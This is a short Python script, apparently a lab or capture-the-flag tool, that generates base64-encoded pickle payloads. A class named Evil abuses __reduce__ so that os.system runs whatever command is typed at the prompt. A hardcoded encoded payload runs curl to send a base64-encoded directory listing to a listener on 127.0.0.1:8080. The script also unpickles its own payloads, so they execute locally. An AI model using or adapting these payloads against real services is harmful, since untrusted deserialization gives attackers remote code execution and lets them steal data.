import pickle
import os
import base64
a='gAN9cQAoWAQAAABuYW1lcQFjcG9zaXgKc3lzdGVtCnECWDIAAABjdXJsICJodHRwOi8vMTI3LjAuMC4xOjgwODAvPyQobHMgLWFsfGJhc2U2NCAtdzApInEDhXEEUnEFWAYAAAB1c2VyaWRxBlgEAAAAdGVzdHEHWAgAAABwYXNzd29yZHEIWAYAAABwQGFzc3NxCXUu'

cmd = ''
class Evil(object):
    def __reduce__(self):
        return(os.system, (cmd,))

while True:
    cmd = input('command : ')
    enc = base64.b64encode(pickle.dumps({'name' : Evil(), 'userid' : 'test', 'password' : 'p@ss'}))
    print('b64 : ' + str(enc))
    print(pickle.loads(base64.b64decode(enc)))
    print('local : ' + str(os.system(cmd)))
    print('####################################')
